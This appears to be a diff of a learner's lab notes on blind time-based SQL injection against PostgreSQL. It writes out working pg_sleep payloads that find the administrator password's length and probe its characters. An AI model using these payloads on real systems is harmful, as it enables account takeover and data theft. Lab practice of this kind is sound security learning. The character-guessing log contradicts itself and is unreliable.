@@ -54,6 +54,40 @@
 - Reformulating...
 - New payload attempt: fake'%3BSELECT+CASE+WHEN+(username+=+'administrator'+AND+LENGTH(password)+>+1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- (:white_check_mark)
     - IT WORKS!!! -> need to continue testing for length
+    - Greater than 10
+    - Less than or equal to 20
+    - Greater than 15
+    - Greater than 17
+    - Either 18, 19, or 20
+        - Not 18
+        - Not 19
+        - Yes 20! (:white_check_mark)
+            - Payload: fake'%3BSELECT+CASE+WHEN+(username+=+'administrator'+AND+LENGTH(password)+=+20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+            - Only 1 equal sign (not usual ==)
+    - Password is 20 (will need to use a LOT of payloads since I am doing it manually)
+- Payload for letter equality: fake'%3BSELECT+CASE+WHEN+(username+=+'administrator'+AND+SUBSTRING(password,1,1)+>+'m')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+    - Having ASCII Chart is nice ![ASCII Chart](./ASCII-Chart.webp)
+    - Letter 1: C
+        - Greater than 'm'
+        - Greater than 'M'
+        - Greater than 'G'
+        - Greater than 'D'
+        - Either 'A','B','C'
+            - Not 'A'
+            - Not 'B'
+            - Not 'C'
+        - Thus, not a letter
+        - Try numbers next
+            - Greater than '5'
+            - Greater than '2'
+            - Not '1'
+        - Try other symbols before numbers and after whitespace characters
+            - Greater than ')'
+            - Greater than '$'
+            - Greater than '"'
+            - Not !
+        - IDK WHAT IS HAPPENING LOL
+            - At least some delays are happening though :)
 
 
 # Observations
